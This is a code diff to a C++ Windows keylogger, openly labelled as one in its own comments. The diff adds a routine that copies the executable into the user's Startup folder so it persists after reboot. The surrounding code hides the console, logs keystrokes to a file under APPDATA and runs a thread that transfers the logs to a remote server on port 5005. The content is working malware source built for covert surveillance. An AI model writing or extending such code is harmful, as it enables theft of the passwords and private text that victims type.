@@ -7,10 +7,26 @@ using namespace std;
 const string SERVER = "";
 const int PORT = 5005;
 const int DELAY = 500;
+
 bool noConsole = true;
+bool startup = false;
 
 string logFileName = "keylogs.txt";
 string appData = string(getenv("APPDATA")) + "\\";
+
+// Register Keylogger to Startup Folder
+void RegisterStartup(string fileName)
+{
+    string startupPath = "C:/Users/" + (string)getenv("USERNAME") + 
+        "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+
+    fileName.erase(fileName.length() - 4);
+    fileName = fileName + ".exe";
+    startupPath += fileName;
+
+    ifstream clientFile(startupPath);
+    if (!clientFile.is_open()) CopyFileA(fileName.data(), startupPath.data(), 0);
+}
 
 // Write Pressed Keys to File
 void LogKey(char* key)
@@ -482,6 +498,7 @@ int transferLogs()
 int main()
 {
     if (noConsole) FreeConsole(); // Disable Terminal Pop-Up
+    if (startup) RegisterStartup(__FILE__); // Register to Startup Folder
 
     thread t(transferLogs);
     t.detach();
